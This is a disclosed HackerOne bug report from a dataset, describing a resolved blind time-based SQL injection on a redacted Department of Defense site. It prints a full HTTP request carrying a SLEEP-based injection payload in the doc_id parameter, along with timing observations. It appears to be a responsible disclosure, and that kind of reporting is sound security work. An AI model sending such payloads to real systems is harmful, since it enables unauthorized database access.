---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '488795'
original_report_id: '488795'
title: SQL injection on the https://████/
weakness: SQL Injection
team_handle: deptofdefense
created_at: '2019-01-30T20:38:01.764Z'
disclosed_at: '2019-10-04T15:19:20.375Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 22
tags:
- hackerone
- sql-injection
---

# SQL injection on the https://████/

## Metadata

- HackerOne Report ID: 488795
- Weakness: SQL Injection
- Program: deptofdefense
- Disclosed At: 2019-10-04T15:19:20.375Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

##Description
Hello. I was able to find Blind SQL injection on the https://███/
Database appears to be MySQL 5.

##POC
```
GET /library.php?path=test&doc_id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(1)))WUeh) HTTP/1.1
Host: ██████
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en,ru;q=0.9,en-US;q=0.8,uk;q=0.7
Cookie: _ga=GA1.2.1697249984.1548431559


```
By issuing sleep(0) response will be delayed to 0 seconds.
By issuing sleep(1) response will be delayed to 5 seconds.
By issuing sleep(2) response will be delayed to 10 seconds.
By issuing sleep(5) response will be delayed to 25 seconds.

As POC, I retrieved count of databases (3). No other information was accessed (such as tables or data):


Apparently, SQL statement is executing 5 times on the database side, because response time always 5 times bigger than supplied sleep value.

## Impact

SQL injection usually have high-critical impact.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
